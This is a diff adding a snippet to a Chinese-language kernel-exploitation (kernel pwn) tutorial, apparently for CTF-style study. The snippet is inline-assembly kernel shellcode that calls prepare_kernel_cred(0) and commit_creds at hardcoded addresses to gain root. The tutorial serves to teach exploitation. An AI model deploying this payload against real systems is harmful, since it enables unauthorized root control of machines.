@@ -268,6 +268,21 @@ call rax
 ## 5.4 常见的kernel shellcode<br>
 ### 5.4.1 权限提升<br>
 先前提到，权限提升通常是执行`commit_creds(init_cred)`来完成，所以在能够在内核态下执行shellcode时，我们可以编写shellcode执行`commit_creds(init_cred)`即可完成提权。<br>
+```c
+__attribute__((naked,noinline)) void privilege_escalation_kernel_shellcode(){
+    __asm__ (
+        "mov rbx, 0xffffffff810895e0;" //prepare_kernel_cred_addr
+        "mov rdi, 0;"
+        "call rbx;"     //prepare_kernel_cred(0)
+        "mov rdi, rax;" 
+        "mov rbx, 0xffffffff810892c0;" //commit_creds_addr
+        "call rbx;"
+        "nop;"
+        "ret;"
+    );
+}
+// gcc -masm=intel  xxx.c -o xxx
+```
 
 
 # 特典: kernel pwn tricks:<br>
